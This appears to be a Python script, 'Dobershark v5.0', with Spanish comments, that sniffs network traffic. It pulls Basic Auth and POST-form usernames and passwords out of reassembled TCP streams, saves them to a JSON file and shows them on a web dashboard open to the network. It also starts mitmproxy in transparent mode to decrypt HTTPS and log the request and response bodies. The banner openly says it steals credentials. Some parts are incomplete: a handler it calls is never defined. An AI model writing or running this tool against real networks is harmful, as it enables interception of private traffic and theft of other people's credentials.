#!/usr/bin/env python3
# Dobershark v5.0 - HTTPS + Credentials + Web Interface + Full Analysis
# "El Doberman ahora descifra HTTPS, roba credenciales y tiene UI web"
# Compatible: Windows (Npcap), Linux, Termux

import sys
import os
import signal
import re
import hashlib
import threading
import time
import json
import base64
from datetime import datetime
from collections import defaultdict
from urllib.parse import urlparse, parse_qs

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.inet6 import IPv6
    from scapy.layers.l2 import Ether, ARP
    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
except ImportError:
    print("[!] Scapy no instalado. Ejecuta: pip install scapy")
    sys.exit(1)

# ========== CONFIGURACIÓN ==========
SILENT_MODE = False
HTTP_DOWNLOAD_DIR = "http_downloads"
TCP_SESSION_DIR = "tcp_sessions"
SMB_FILE_DIR = "smb_extracted"
CREDENTIALS_FILE = "captured_credentials.json"
WEB_PORT = 8080
MITM_PORT = 8081

for dir_name in [HTTP_DOWNLOAD_DIR, TCP_SESSION_DIR, SMB_FILE_DIR]:
    os.makedirs(dir_name, exist_ok=True)

# ========== CREDENTIALS STORAGE ==========
credentials_found = []

# ========== TCP SESSION REASSEMBLY ==========
class TCPSession:
    def __init__(self, src_ip, src_port, dst_ip, dst_port):
        self.src_ip = src_ip
        self.src_port = src_port
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.key = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
        self.buffer = b''
        self.segments = {}
        self.next_seq = None
        self.start_time = datetime.now()
        self.last_seen = datetime.now()
        self.bytes_received = 0
        self.bytes_sent = 0
        self.http_requests = []
        self.http_responses = []
        
    def add_segment(self, seq, data, direction='rx'):
        self.last_seen = datetime.now()
        if direction == 'rx':
            self.bytes_received += len(data)
        else:
            self.bytes_sent += len(data)
        self.segments[seq] = data
        self._reassemble()
    
    def _reassemble(self):
        if not self.segments:
            return
        sorted_seqs = sorted(self.segments.keys())
        if self.next_seq is None:
            self.next_seq = sorted_seqs[0]
            self.buffer = b''
        new_buffer = b''
        current_seq = self.next_seq
        for seq in sorted_seqs:
            if seq == current_seq:
                new_buffer += self.segments[seq]
                current_seq += len(self.segments[seq])
        if new_buffer:
            self.buffer = new_buffer
            self.next_seq = current_seq
            self._extract_credentials()
            if len(self.buffer) > 1024 * 10:
                self.save_session()
    
    def _extract_credentials(self):
        """Extrae credenciales del buffer TCP"""
        try:
            data = self.buffer.decode('utf-8', errors='ignore')
            
            # Basic Auth
            basic_auth_pattern = r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)'
            for match in re.finditer(basic_auth_pattern, data, re.IGNORECASE):
                try:
                    decoded = base64.b64decode(match.group(1)).decode('utf-8')
                    if ':' in decoded:
                        username, password = decoded.split(':', 1)
                        cred = {
                            'type': 'Basic Auth',
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'src': f"{self.src_ip}:{self.src_port}",
                            'dst': f"{self.dst_ip}:{self.dst_port}"
                        }
                        if cred not in credentials_found:
                            credentials_found.append(cred)
                            save_credentials()
                            if not SILENT_MODE:
                                print(f"\n[🔑 CREDENTIALS] Basic Auth: {username}:{password}")
                except:
                    pass
            
            # POST Form credentials
            post_pattern = r'(username|user|email|login)=([^&\s]+).*?(password|pass|pwd)=([^&\s]+)'
            for match in re.finditer(post_pattern, data, re.IGNORECASE):
                cred = {
                    'type': 'POST Form',
                    'username': match.group(2),
                    'password': match.group(4),
                    'timestamp': datetime.now().isoformat(),
                    'src': f"{self.src_ip}:{self.src_port}",
                    'dst': f"{self.dst_ip}:{self.dst_port}"
                }
                if cred not in credentials_found:
                    credentials_found.append(cred)
                    save_credentials()
                    if not SILENT_MODE:
                        print(f"\n[🔑 CREDENTIALS] POST: {match.group(2)}:{match.group(4)}")
        except:
            pass
    
    def save_session(self):
        if len(self.buffer) > 0:
            filename = f"{TCP_SESSION_DIR}/{self.key.replace(':', '_')}_{self.start_time.strftime('%Y%m%d_%H%M%S')}.bin"
            with open(filename, 'wb') as f:
                f.write(self.buffer)

tcp_sessions = {}

# ========== HTTP FILE EXTRACTION ==========
class HTTPFileExtractor:
    def __init__(self):
        self.downloads = {}
        
    def extract_filename(self, headers, url):
        if 'Content-Disposition' in headers:
            match = re.search(r'filename="?([^"]+)"?', headers['Content-Disposition'])
            if match:
                return match.group(1)
        if url:
            filename = url.split('/')[-1].split('?')[0]
            if filename and '.' in filename and len(filename) < 255:
                return filename
        return f"download_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
    
    def process_response(self, conn_key, response_data, headers, url):
        if conn_key not in self.downloads:
            self.downloads[conn_key] = {'data': b'', 'filename': None}
        
        self.downloads[conn_key]['data'] += response_data
        if not self.downloads[conn_key]['filename']:
            self.downloads[conn_key]['filename'] = self.extract_filename(headers, url)
        
        content_length = int(headers.get('Content-Length', 0))
        if content_length > 0 and len(self.downloads[conn_key]['data']) >= content_length:
            self.save_file(conn_key)
    
    def save_file(self, conn_key):
        download = self.downloads[conn_key]
        if len(download['data']) > 0:
            filepath = os.path.join(HTTP_DOWNLOAD_DIR, download['filename'])
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filepath)
                filepath = f"{name}_{counter}{ext}"
                counter += 1
            with open(filepath, 'wb') as f:
                f.write(download['data'])
            del self.downloads[conn_key]

http_extractor = HTTPFileExtractor()

# ========== CREDENTIALS SAVE ==========
def save_credentials():
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(credentials_found, f, indent=2)

# ========== WEB INTERFACE ==========
def web_interface():
    """Servidor web para ver sesiones y credenciales"""
    try:
        from flask import Flask, render_template_string, jsonify, send_from_directory
        from flask_socketio import SocketIO, emit
        import eventlet
        
        app = Flask(__name__)
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        HTML_TEMPLATE = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Dobershark - Live Monitor</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 0; padding: 20px; }
                h1 { color: #ff6600; border-bottom: 2px solid #ff6600; }
                .section { background: #1a1a1a; margin: 20px 0; padding: 15px; border-radius: 5px; }
                .credential { background: #2a1a1a; border-left: 4px solid #ff0000; padding: 10px; margin: 10px 0; }
                .session { background: #1a2a1a; border-left: 4px solid #00ff00; padding: 10px; margin: 10px 0; font-size: 12px; }
                .file { background: #1a1a2a; border-left: 4px solid #0066ff; padding: 10px; margin: 10px 0; }
                .timestamp { color: #888; font-size: 11px; }
                .badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
                .badge-http { background: #0066ff; }
                .badge-cred { background: #ff0000; }
                .badge-file { background: #00ff00; }
                table { width: 100%; border-collapse: collapse; }
                td, th { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
                .refresh { position: fixed; top: 20px; right: 20px; background: #ff6600; color: #000; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
            </style>
            <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
            <script>
                var socket = io();
                socket.on('update', function(data) {
                    if(data.type === 'credential') {
                        var div = document.createElement('div');
                        div.className = 'credential';
                        div.innerHTML = '<span class="badge badge-cred">CRED</span> <strong>' + data.username + '</strong>:<strong>' + data.password + '</strong><br><span class="timestamp">' + data.timestamp + ' | ' + data.src + ' -> ' + data.dst + '</span>';
                        document.getElementById('credentials').prepend(div);
                    }
                });
                function refreshSessions() {
                    fetch('/api/sessions').then(r=>r.json()).then(data => {
                        var html = '';
                        data.forEach(s => {
                            html += '<div class="session"><span class="badge badge-http">TCP</span> ' + s.key + '<br><span class="timestamp">Bytes: ' + s.bytes + ' | Duration: ' + s.duration.toFixed(2) + 's</span></div>';
                        });
                        document.getElementById('sessions').innerHTML = html;
                    });
                }
                setInterval(refreshSessions, 3000);
                refreshSessions();
            </script>
        </head>
        <body>
            <div class="refresh" onclick="location.reload()">⟳ Refresh</div>
            <h1>🐕‍🦺 DOBERSHARK v5.0 - LIVE MONITOR</h1>
            
            <div class="section">
                <h2>🔑 Credentials Captured</h2>
                <div id="credentials">
                    {% for cred in credentials %}
                    <div class="credential">
                        <span class="badge badge-cred">CRED</span>
                        <strong>{{ cred.username }}</strong>:<strong>{{ cred.password }}</strong><br>
                        <span class="timestamp">{{ cred.timestamp }} | {{ cred.src }} -> {{ cred.dst }}</span>
                    </div>
                    {% endfor %}
                </div>
            </div>
            
            <div class="section">
                <h2>📡 Active TCP Sessions</h2>
                <div id="sessions">Loading...</div>
            </div>
            
            <div class="section">
                <h2>📁 Downloaded Files</h2>
                {% for file in files %}
                <div class="file">
                    <span class="badge badge-file">FILE</span>
                    <a href="/download/{{ file }}" style="color:#0f0;">{{ file }}</a>
                </div>
                {% endfor %}
            </div>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            files = os.listdir(HTTP_DOWNLOAD_DIR)[:20]
            return render_template_string(HTML_TEMPLATE, credentials=credentials_found[-50:], files=files)
        
        @app.route('/api/sessions')
        def api_sessions():
            sessions = []
            for session in tcp_sessions.values():
                sessions.append({
                    'key': session.key,
                    'bytes': session.bytes_received + session.bytes_sent,
                    'duration': (datetime.now() - session.start_time).total_seconds()
                })
            return jsonify(sessions[-50:])
        
        @app.route('/download/<filename>')
        def download_file(filename):
            return send_from_directory(HTTP_DOWNLOAD_DIR, filename)
        
        print(f"[Web] Interfaz web en http://localhost:{WEB_PORT}")
        socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)
    except ImportError:
        print("[!] Flask no instalado. Web interface disabled. Instala: pip install flask flask-socketio eventlet")

# ========== MITMPROXY INTEGRATION ==========
def start_mitm_proxy():
    """Inicia mitmdump para descifrar HTTPS"""
    try:
        import subprocess
        cert_dir = "mitm_certs"
        os.makedirs(cert_dir, exist_ok=True)
        
        # Script de mitmproxy para guardar tráfico descifrado
        mitm_script = '''
from mitmproxy import http
import json
import base64

def request(flow: http.HTTPFlow) -> None:
    # Guardar request descifrada
    data = {
        'type': 'request',
        'method': flow.request.method,
        'url': flow.request.pretty_url,
        'headers': dict(flow.request.headers),
        'content': base64.b64encode(flow.request.content).decode('utf-8')
    }
    with open('mitm_traffic.json', 'a') as f:
        f.write(json.dumps(data) + '\\n')

def response(flow: http.HTTPFlow) -> None:
    data = {
        'type': 'response',
        'url': flow.request.pretty_url,
        'status': flow.response.status_code,
        'headers': dict(flow.response.headers),
        'content': base64.b64encode(flow.response.content).decode('utf-8')
    }
    with open('mitm_traffic.json', 'a') as f:
        f.write(json.dumps(data) + '\\n')
'''
        
        script_path = "mitm_script.py"
        with open(script_path, 'w') as f:
            f.write(mitm_script)
        
        # Iniciar mitmdump
        cmd = f"mitmdump -q --mode transparent --listen-port {MITM_PORT} -s {script_path}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if not SILENT_MODE:
            print(f"[🔓 HTTPS] mitmproxy iniciado en puerto {MITM_PORT}")
            print(f"[🔓 HTTPS] Configura tu navegador para usar proxy localhost:{MITM_PORT}")
            print(f"[🔓 HTTPS] Certificado en ~/.mitmproxy/mitmproxy-ca-cert.pem")
        
        return process
    except Exception as e:
        print(f"[!] mitmproxy error: {e}")
        print("[!] Instala: pip install mitmproxy")
        return None

# ========== PACKET CALLBACK ==========
def packet_callback(packet):
    """Procesador principal"""
    if TCP in packet and IP in packet:
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        payload = bytes(tcp_layer.payload)
        
        if len(payload) == 0:
            return
        
        src_ip = ip_layer.src
        dst_ip = ip_layer.dst
        src_port = tcp_layer.sport
        dst_port = tcp_layer.dport
        seq = tcp_layer.seq
        
        session_key = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
        
        if session_key in tcp_sessions:
            session = tcp_sessions[session_key]
            session.add_segment(seq, payload, 'rx')
        else:
            session = TCPSession(src_ip, src_port, dst_ip, dst_port)
            session.add_segment(seq, payload, 'rx')
            tcp_sessions[session_key] = session
            
            if not SILENT_MODE:
                print(f"\n[TCP Session] Nueva: {session_key}")
        
        # HTTP file extraction
        if src_port == 80 or dst_port == 80:
            if b'HTTP/' in payload[:20] and b'200 OK' in payload[:100]:
                # Intentar extraer archivos...
                pass

# ========== MAIN ==========
def main():
    global SILENT_MODE
    
    # Parsear argumentos
    iface = None
    filtro = None
    web_enabled = False
    https_enabled = False
    mitm_process = None
    
    for i, arg in enumerate(sys.argv):
        if arg in ["--silent", "-s"]:
            SILENT_MODE = True
        elif arg == "--web":
            web_enabled = True
        elif arg == "--https":
            https_enabled = True
        elif arg == "-i" and i+1 < len(sys.argv):
            iface = sys.argv[i+1]
        elif arg == "-f" and i+1 < len(sys.argv):
            filtro = sys.argv[i+1]
    
    if not SILENT_MODE:
        print("""
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║         🐕‍🦺 DOBERSHARK v5.0 - HTTPS + CREDENTIALS + WEB UI           ║
    ║   "El Doberman definitivo: descifra, roba credenciales y monitorea"  ║
    ╚═══════════════════════════════════════════════════════════════════════╝
        """)
    
    if not iface:
        print("[!] Uso: python dobershark.py -i <interfaz> [--web] [--https]")
        print("\nModos:")
        print("  --web              Activa interfaz web (puerto 8080)")
        print("  --https            Activa mitmproxy para descifrar HTTPS")
        print("  -s                 Modo silencioso")
        print("\nEjemplos:")
        print("  sudo python dobershark.py -i eth0 --web")
        print("  sudo python dobershark.py -i eth0 --https --web")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Iniciar HTTPS descifrado
    if https_enabled:
        mitm_process = start_mitm_proxy()
        if mitm_process:
            print(f"[*] mitmproxy PID: {mitm_process.pid}")
    
    # Iniciar web interface en hilo separado
    if web_enabled:
        web_thread = threading.Thread(target=web_interface, daemon=True)
        web_thread.start()
        time.sleep(2)  # Dar tiempo a que flask inicie
    
    print(f"[Dobershark] Capturando en: {iface}")
    print(f"[Dobershark] Credentials -> {CREDENTIALS_FILE}")
    if filtro:
        print(f"[Dobershark] Filtro: {filtro}")
    print("[Dobershark] Ctrl+C para detener...\n")
    
    try:
        sniff(iface=iface, filter=filtro, prn=packet_callback, store=False)
    except PermissionError:
        print("\n[!] Ejecuta con sudo/administrador")
    except KeyboardInterrupt:
        pass
    finally:
        if mitm_process:
            mitm_process.terminate()
        print(f"\n[✅] Credenciales capturadas: {len(credentials_found)}")
        for cred in credentials_found:
            print(f"  - {cred['type']}: {cred['username']}:{cred['password']}")

if __name__ == "__main__":
    main()
